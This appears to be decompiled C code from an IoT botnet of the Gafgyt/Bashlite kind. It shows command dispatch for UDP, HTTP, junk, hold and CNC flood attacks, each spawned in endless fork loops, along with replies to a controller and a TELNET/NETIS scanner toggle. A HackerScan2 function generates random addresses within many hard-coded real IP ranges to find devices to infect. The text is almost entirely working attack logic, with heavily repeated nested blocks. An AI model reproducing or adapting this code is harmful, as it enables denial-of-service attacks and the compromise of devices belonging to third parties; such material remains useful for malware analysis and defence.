                                                                                                                            sendSTD(v260, v261, v262);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v263, v261, v262);
                                                                                                                    v244 = listFork();
                                                                                                                        sendJUNK(v249, v250, v251);
                                                                                                                        sendSTD(v249, v250, v251);
                                                                                                                        sendHOLD(v249, v250, v251);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v242, v250, v251);
                                                                                                                            sendSTD(v242, v250, v251);
                                                                                                                            sendHOLD(v242, v250, v251);
                                                                                                                            __libc_close((int32_t)v143);
                                                                                                                                        result5 = listFork();
                                                                                                                                            sendSTD(v260, v261, v262);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() != 0) {
                                                                                                                                                sendSTD(v263, v261, v262);
                                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v260, v261, v262);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v263, v261, v262);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v249, v250, v251);
                                                                                            sendSTD(v249, v250, v251);
                                                                                            sendHOLD(v249, v250, v251);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v242, v250, v251);
                                                                                                sendSTD(v242, v250, v251);
                                                                                                sendHOLD(v242, v250, v251);
                                                                                                __libc_close((int32_t)v143);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v260, v261, v262);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v263, v261, v262);
                                                                                    if (listFork() == 0) {
                                                                                        sendCNC(v236, v237, v238);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v239, v237, v238);
                                                                                            __libc_close((int32_t)v143);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendJUNK(v249, v250, v251);
                                                                                                            sendSTD(v249, v250, v251);
                                                                                                            sendHOLD(v249, v250, v251);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendJUNK(v242, v250, v251);
                                                                                                                sendSTD(v242, v250, v251);
                                                                                                                sendHOLD(v242, v250, v251);
                                                                                                                __libc_close((int32_t)v143);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                if (listFork() == 0) {
                                                                                                    sendJUNK(v249, v250, v251);
                                                                                                    sendSTD(v249, v250, v251);
                                                                                                    sendHOLD(v249, v250, v251);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendJUNK(v242, v250, v251);
                                                                                                        sendSTD(v242, v250, v251);
                                                                                                        sendHOLD(v242, v250, v251);
                                                                                                        __libc_close((int32_t)v143);
                                                                                            if (listFork() == 0) {
                                                                                                sendCNC(v236, v237, v238);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendCNC(v239, v237, v238);
                                                                                                    __libc_close((int32_t)v143);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendJUNK(v249, v250, v251);
                                                                                                                    sendSTD(v249, v250, v251);
                                                                                                                    sendHOLD(v249, v250, v251);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendJUNK(v242, v250, v251);
                                                                                                                        sendSTD(v242, v250, v251);
                                                                                                                        sendHOLD(v242, v250, v251);
                                                                                                                        __libc_close((int32_t)v143);
                                        if (listFork() == 0) {
                                            sendJUNK(v180, v181, v182);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendJUNK(v319, v181, v182);
                                                    __libc_close((int32_t)v143);
                                            v219 = _strncmp((char *)*a2, "UDP", 4);
                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                            v244 = listFork();
                                                                                sendJUNK(v249, v250, v251);
                                                                                sendSTD(v249, v250, v251);
                                                                                sendHOLD(v249, v250, v251);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v242, v250, v251);
                                                                                    sendSTD(v242, v250, v251);
                                                                                    sendHOLD(v242, v250, v251);
                                                                                    __libc_close((int32_t)v143);
                                                                        v227 = listFork();
                                                                            sendCNC(v236, v237, v238);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v239, v237, v238);
                                                                                __libc_close((int32_t)v143);
                                                                                            v244 = listFork();
                                                                                                sendJUNK(v249, v250, v251);
                                                                                                sendSTD(v249, v250, v251);
                                                                                                sendHOLD(v249, v250, v251);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v242, v250, v251);
                                                                                                    sendSTD(v242, v250, v251);
                                                                                                    sendHOLD(v242, v250, v251);
                                                                                                    __libc_close((int32_t)v143);
                                                            v225 = listFork();
                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                    v244 = listFork();
                                                                                        sendJUNK(v249, v250, v251);
                                                                                        sendSTD(v249, v250, v251);
                                                                                        sendHOLD(v249, v250, v251);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v242, v250, v251);
                                                                                            sendSTD(v242, v250, v251);
                                                                                            sendHOLD(v242, v250, v251);
                                                                                            __libc_close((int32_t)v143);
                                                                                v227 = listFork();
                                                                                    sendCNC(v236, v237, v238);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v239, v237, v238);
                                                                                        __libc_close((int32_t)v143);
                                                                                                    v244 = listFork();
                                                                                                        sendJUNK(v249, v250, v251);
                                                                                                        sendSTD(v249, v250, v251);
                                                                                                        sendHOLD(v249, v250, v251);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v242, v250, v251);
                                                                                                            sendSTD(v242, v250, v251);
                                                                                                            sendHOLD(v242, v250, v251);
                                                                                                            __libc_close((int32_t)v143);
                                                                                v224 = listFork();
                                                                                    sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                            v244 = listFork();
                                                                                                                sendJUNK(v249, v250, v251);
                                                                                                                sendSTD(v249, v250, v251);
                                                                                                                sendHOLD(v249, v250, v251);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v242, v250, v251);
                                                                                                                    sendSTD(v242, v250, v251);
                                                                                                                    sendHOLD(v242, v250, v251);
                                                                                                                    __libc_close((int32_t)v143);
                                                                                                        v227 = listFork();
                                                                                                            sendCNC(v236, v237, v238);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v239, v237, v238);
                                                                                                                __libc_close((int32_t)v143);
                                                                                                                            v244 = listFork();
                                                                                                                                sendJUNK(v249, v250, v251);
                                                                                                                                sendSTD(v249, v250, v251);
                                                                                                                                sendHOLD(v249, v250, v251);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendJUNK(v242, v250, v251);
                                                                                                                                    sendSTD(v242, v250, v251);
                                                                                                                                    sendHOLD(v242, v250, v251);
                                                                                                                                    __libc_close((int32_t)v143);
                                                                                            v225 = listFork();
                                                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                                    v244 = listFork();
                                                                                                                        sendJUNK(v249, v250, v251);
                                                                                                                        sendSTD(v249, v250, v251);
                                                                                                                        sendHOLD(v249, v250, v251);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendJUNK(v242, v250, v251);
                                                                                                                            sendSTD(v242, v250, v251);
                                                                                                                            sendHOLD(v242, v250, v251);
                                                                                                                            __libc_close((int32_t)v143);
                                                                                                                v227 = listFork();
                                                                                                                    sendCNC(v236, v237, v238);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v239, v237, v238);
                                                                                                                        __libc_close((int32_t)v143);
                                                                                                                                    v244 = listFork();
                                                                                                                                        sendJUNK(v249, v250, v251);
                                                                                                                                        sendSTD(v249, v250, v251);
                                                                                                                                        sendHOLD(v249, v250, v251);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendJUNK(v242, v250, v251);
                                                                                                                                            sendSTD(v242, v250, v251);
                                                                                                                                            sendHOLD(v242, v250, v251);
                                                                                                                                            __libc_close((int32_t)v143);
                                        v219 = _strncmp((char *)*a2, "UDP", 4);
                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v249, v250, v251);
                                                                            sendSTD(v249, v250, v251);
                                                                            sendHOLD(v249, v250, v251);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v242, v250, v251);
                                                                                sendSTD(v242, v250, v251);
                                                                                sendHOLD(v242, v250, v251);
                                                                                __libc_close((int32_t)v143);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v236, v237, v238);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v239, v237, v238);
                                                                            __libc_close((int32_t)v143);
                                                                                        if (listFork() == 0) {
                                                                                            sendJUNK(v249, v250, v251);
                                                                                            sendSTD(v249, v250, v251);
                                                                                            sendHOLD(v249, v250, v251);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendJUNK(v242, v250, v251);
                                                                                                sendSTD(v242, v250, v251);
                                                                                                sendHOLD(v242, v250, v251);
                                                                                                __libc_close((int32_t)v143);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v236, v237, v238);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v239, v237, v238);
                                                                                    __libc_close((int32_t)v143);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v210, v187, v188, v189, v190, v158);
                                                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v236, v237, v238);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendCNC(v239, v237, v238);
                                                                                                            __libc_close((int32_t)v143);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendCNC(v236, v237, v238);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendCNC(v239, v237, v238);
                                                                                                                    __libc_close((int32_t)v143);
                                    if (listFork() == 0) {
                                        sendHOLD(v177, v178, v179);
                                        while (true) {
                                            if (listFork() == 0) {
                                                sendHOLD(v321, v178, v179);
                                            v219 = _strncmp((char *)*a2, "UDP", 4);
                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        v227 = listFork();
                                                                            sendCNC(v236, v237, v238);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v239, v237, v238);
                                                                                __libc_close((int32_t)v143);
                                                            v225 = listFork();
                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                v227 = listFork();
                                                                                    sendCNC(v236, v237, v238);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v239, v237, v238);
                                                                                        __libc_close((int32_t)v143);
                                                                                v224 = listFork();
                                                                                    sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                        v227 = listFork();
                                                                                                            sendCNC(v236, v237, v238);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v239, v237, v238);
                                                                                                                __libc_close((int32_t)v143);
                                                                                            v225 = listFork();
                                                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                                v227 = listFork();
                                                                                                                    sendCNC(v236, v237, v238);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendCNC(v239, v237, v238);
                                                                                                                        __libc_close((int32_t)v143);
                                                            if (listFork() == 0) {
                                                                sendJUNK(v180, v181, v182);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendJUNK(v209, v181, v182);
                                                                    __libc_close((int32_t)v143);
                                                            v219 = _strncmp((char *)*a2, "UDP", 4);
                                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                        v227 = listFork();
                                                                                            sendCNC(v236, v237, v238);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v239, v237, v238);
                                                                                                __libc_close((int32_t)v143);
                                                                            v225 = listFork();
                                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                v227 = listFork();
                                                                                                    sendCNC(v236, v237, v238);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v239, v237, v238);
                                                                                                        __libc_close((int32_t)v143);
                                                                                                v224 = listFork();
                                                                                                    sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                                        v227 = listFork();
                                                                                                                            sendCNC(v236, v237, v238);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendCNC(v239, v237, v238);
                                                                                                                                __libc_close((int32_t)v143);
                                                                                                            v225 = listFork();
                                                                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                                                v227 = listFork();
                                                                                                                                    sendCNC(v236, v237, v238);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendCNC(v239, v237, v238);
                                                                                                                                        __libc_close((int32_t)v143);
                                        v219 = _strncmp((char *)*a2, "UDP", 4);
                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v236, v237, v238);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v239, v237, v238);
                                                                            __libc_close((int32_t)v143);
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v236, v237, v238);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v239, v237, v238);
                                                                                    __libc_close((int32_t)v143);
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendUDP(v210, v187, v188, v189, v190, v158);
                                                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                        if (listFork() == 0) {
                                                            sendJUNK(v180, v181, v182);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendJUNK(v209, v181, v182);
                                                                __libc_close((int32_t)v143);
                                                        v219 = _strncmp((char *)*a2, "UDP", 4);
                                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                            if (listFork() == 0) {
                                                                                                sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                        kill(v330, 9);
                        HackerPrint((int32_t)v143, (int32_t)" OFF");
                        v211 = _strncmp((char *)*a2, "NETIS", 6);
                                HackerPrint((int32_t)v143, (int32_t)"[NETIS] SCANNER Starting");
                                StartTheNetis();
                                v219 = _strncmp((char *)*a2, "UDP", 4);
                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                if (listFork() == 0) {
                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v186, v187, v188, v189, v190, v158);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendUDP(v210, v187, v188, v189, v190, v158);
                                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                if (listFork() == 0) {
                                                    sendJUNK(v180, v181, v182);
                                                    while (true) {
                                                        if (listFork() != 0) {
                                                        sendJUNK(v209, v181, v182);
                                                        __libc_close((int32_t)v143);
                                                v219 = _strncmp((char *)*a2, "UDP", 4);
                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                            if (listFork() == 0) {
                                                sendHOLD(v177, v178, v179);
                                                while (true) {
                                                    if (listFork() != 0) {
                                                    sendHOLD(v208, v178, v179);
                                                v219 = _strncmp((char *)*a2, "UDP", 4);
                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v180, v181, v182);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v209, v181, v182);
                                                                        __libc_close((int32_t)v143);
                                                                v219 = _strncmp((char *)*a2, "UDP", 4);
                                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v186, v187, v188, v189, v190, v158);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendUDP(v210, v187, v188, v189, v190, v158);
                                                                                                    v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                            int32_t v334 = __libc_fork(3); // 0x8050123
                    HackerPrint((int32_t)v143, (int32_t)"TELNET ON | OFF");
            __GI_inet_ntoa(v335);
            HackerPrint((int32_t)v143, (int32_t)"My IP: %s");
        HackerPrint((int32_t)v143, (int32_t)"PONG!");
=================FUNCTION : HackerScan2 ===================
++++++++ FUNCTION START 7746
++++++++ FUNCTION END 9152
++++++++ FUNCTION LENGTH 1406
    int32_t v144 = random(); // 0x8049bc8
    int32_t v145 = random(); // 0x8049c08
    int32_t v146 = random(); // 0x8049c48
    int32_t v147 = random(); // 0x8049c88
    int32_t v148 = random() % 208; // 0x8049ce5
        szprintf(v150, (int32_t)"112.5.%d.%d", (int32_t)v142);
        szprintf(v151, (int32_t)"117.165.%d.%d", (int32_t)v142);
        szprintf(v152, (int32_t)"85.3.%d.%d", (int32_t)v142);
        szprintf(v153, (int32_t)"37.158.%d.%d", (int32_t)v142);
        szprintf(v154, (int32_t)"95.9.%d.%d", (int32_t)v142);
        szprintf(v155, (int32_t)"41.252.%d.%d", (int32_t)v142);
        szprintf(v156, (int32_t)"58.71.%d.%d", (int32_t)v142);
        szprintf(v157, (int32_t)"104.55.%d.%d", (int32_t)v142);
        szprintf(v158, (int32_t)"78.186.%d.%d", (int32_t)v142);
        szprintf(v159, (int32_t)"78.189.%d.%d", (int32_t)v142);
        szprintf(v160, (int32_t)"221.120.%d.%d", (int32_t)v142);
        szprintf(v161, (int32_t)"88.5.%d.%d", (int32_t)v142);
        szprintf(v162, (int32_t)"41.254.%d.%d", (int32_t)v142);
        szprintf(v163, (int32_t)"103.20.%d.%d", (int32_t)v142);
        szprintf(v164, (int32_t)"103.47.%d.%d", (int32_t)v142);
        szprintf(v165, (int32_t)"103.57.%d.%d", (int32_t)v142);
        szprintf(v166, (int32_t)"45.117.%d.%d", (int32_t)v142);
        szprintf(v167, (int32_t)"101.51.%d.%d", (int32_t)v142);
        szprintf(v168, (int32_t)"137.59.%d.%d", (int32_t)v142);
        szprintf(v169, (int32_t)"1.56.%d.%d", (int32_t)v142);
        szprintf(v170, (int32_t)"1.188.%d.%d", (int32_t)v142);
        szprintf(v171, (int32_t)"14.204.%d.%d", (int32_t)v142);
        szprintf(v172, (int32_t)"27.0.%d.%d", (int32_t)v142);
        szprintf(v173, (int32_t)"27.8.%d.%d", (int32_t)v142);
        szprintf(v174, (int32_t)"27.50.%d.%d", (int32_t)v142);
        szprintf(v175, (int32_t)"27.54.%d.%d", (int32_t)v142);
        szprintf(v176, (int32_t)"27.98.%d.%d", (int32_t)v142);
        szprintf(v177, (int32_t)"27.112.%d.%d", (int32_t)v142);
        szprintf(v178, (int32_t)"27.192.%d.%d", (int32_t)v142);
        szprintf(v179, (int32_t)"36.32.%d.%d", (int32_t)v142);
        szprintf(v180, (int32_t)"36.248.%d.%d", (int32_t)v142);
        szprintf(v181, (int32_t)"39.64.%d.%d", (int32_t)v142);
        szprintf(v182, (int32_t)"42.4.%d.%d", (int32_t)v142);
        szprintf(v183, (int32_t)"42.48.%d.%d", (int32_t)v142);
        szprintf(v184, (int32_t)"42.52.%d.%d", (int32_t)v142);
        szprintf(v185, (int32_t)"42.56.%d.%d", (int32_t)v142);
        szprintf(v186, (int32_t)"42.63.%d.%d", (int32_t)v142);
        szprintf(v187, (int32_t)"42.84.%d.%d", (int32_t)v142);
        szprintf(v188, (int32_t)"42.176.%d.%d", (int32_t)v142);
        szprintf(v189, (int32_t)"42.224.%d.%d", (int32_t)v142);
        szprintf(v190, (int32_t)"42.176.%d.%d", (int32_t)v142);
        szprintf(v191, (int32_t)"43.253.%d.%d", (int32_t)v142);
        szprintf(v192, (int32_t)"43.230.%d.%d", (int32_t)v142);
        szprintf(v193, (int32_t)"163.53.%d.%d", (int32_t)v142);
        szprintf(v194, (int32_t)"43.230.%d.%d", (int32_t)v142);
        szprintf(v195, (int32_t)"62.252.%d.%d", (int32_t)v142);
        szprintf(v196, (int32_t)"43.245.%d.%d", (int32_t)v142);
        szprintf(v197, (int32_t)"62.255.%d.%d", (int32_t)v142);
        szprintf(v198, (int32_t)"123.25.%d.%d", (int32_t)v142);
        szprintf(v199, (int32_t)"103.54.%d.%d", (int32_t)v142);
        szprintf(v200, (int32_t)"27.255.%d.%d", (int32_t)v142);
        szprintf(v201, (int32_t)"103.204.%d.%d", (int32_t)v142);
        szprintf(v202, (int32_t)"123.24.%d.%d", (int32_t)v142);
        szprintf(v203, (int32_t)"113.191.%d.%d", (int32_t)v142);
        szprintf(v204, (int32_t)"81.100.%d.%d", (int32_t)v142);
        szprintf(v205, (int32_t)"113.188.%d.%d", (int32_t)v142);
        szprintf(v206, (int32_t)"113.189.%d.%d", (int32_t)v142);
        szprintf(v207, (int32_t)"94.174.%d.%d", (int32_t)v142);
        szprintf(v208, (int32_t)"14.160.%d.%d", (int32_t)v142);
        szprintf(v209, (int32_t)"14.161.%d.%d", (int32_t)v142);
        szprintf(v210, (int32_t)"14.162.%d.%d", (int32_t)v142);
        szprintf(v211, (int32_t)"14.163.%d.%d", (int32_t)v142);
        szprintf(v212, (int32_t)"14.164.%d.%d", (int32_t)v142);
        szprintf(v213, (int32_t)"14.165.%d.%d", (int32_t)v142);
        szprintf(v214, (int32_t)"14.166.%d.%d", (int32_t)v142);
        szprintf(v215, (int32_t)"14.167.%d.%d", (int32_t)v142);
        szprintf(v216, (int32_t)"14.168.%d.%d", (int32_t)v142);
        szprintf(v217, (int32_t)"14.169.%d.%d", (int32_t)v142);
        szprintf(v218, (int32_t)"14.170.%d.%d", (int32_t)v142);
        szprintf(v219, (int32_t)"14.171.%d.%d", (int32_t)v142);
        szprintf(v220, (int32_t)"14.172.%d.%d", (int32_t)v142);
        szprintf(v221, (int32_t)"14.173.%d.%d", (int32_t)v142);
        szprintf(v222, (int32_t)"14.174.%d.%d", (int32_t)v142);
        szprintf(v223, (int32_t)"14.175.%d.%d", (int32_t)v142);
        szprintf(v224, (int32_t)"14.176.%d.%d", (int32_t)v142);
        szprintf(v225, (int32_t)"14.177.%d.%d", (int32_t)v142);
        szprintf(v226, (int32_t)"14.178.%d.%d", (int32_t)v142);
        szprintf(v227, (int32_t)"14.179.%d.%d", (int32_t)v142);
        szprintf(v228, (int32_t)"14.180.%d.%d", (int32_t)v142);
        szprintf(v229, (int32_t)"14.181.%d.%d", (int32_t)v142);
        szprintf(v230, (int32_t)"14.182.%d.%d", (int32_t)v142);
        szprintf(v231, (int32_t)"14.183.%d.%d", (int32_t)v142);
        szprintf(v232, (int32_t)"14.184.%d.%d", (int32_t)v142);
        szprintf(v233, (int32_t)"14.185.%d.%d", (int32_t)v142);
        szprintf(v234, (int32_t)"14.186.%d.%d", (int32_t)v142);
        szprintf(v235, (int32_t)"14.187.%d.%d", (int32_t)v142);
        szprintf(v236, (int32_t)"14.188.%d.%d", (int32_t)v142);
        szprintf(v237, (int32_t)"14.189.%d.%d", (int32_t)v142);
        szprintf(v238, (int32_t)"14.190.%d.%d", (int32_t)v142);
        szprintf(v239, (int32_t)"14.191.%d.%d", (int32_t)v142);
        szprintf(v240, (int32_t)"45.121.%d.%d", (int32_t)v142);
        szprintf(v241, (int32_t)"45.120.%d.%d", (int32_t)v142);
        szprintf(v242, (int32_t)"45.115.%d.%d", (int32_t)v142);
        szprintf(v243, (int32_t)"43.252.%d.%d", (int32_t)v142);
